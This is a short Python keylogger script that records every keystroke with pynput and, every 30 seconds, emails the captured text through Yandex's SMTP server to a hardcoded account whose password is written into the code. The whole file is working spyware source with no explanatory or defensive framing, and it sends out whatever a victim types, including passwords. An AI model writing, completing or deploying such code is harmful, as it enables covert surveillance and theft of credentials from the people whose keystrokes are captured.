import pynput.keyboard
import smtplib
import threading
log = ""

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def send_email(email,passwords,message):
    email_server = smtplib.SMTP("smtp.yandex.com",587)
    email_server.starttls()
    email_server.login(email,passwords)
    email_server.sendmail(email,email,message)
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("font2929@yandex.com","1597530?",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

with keylogger_listener:
    thread_function()
    keylogger_listener.join()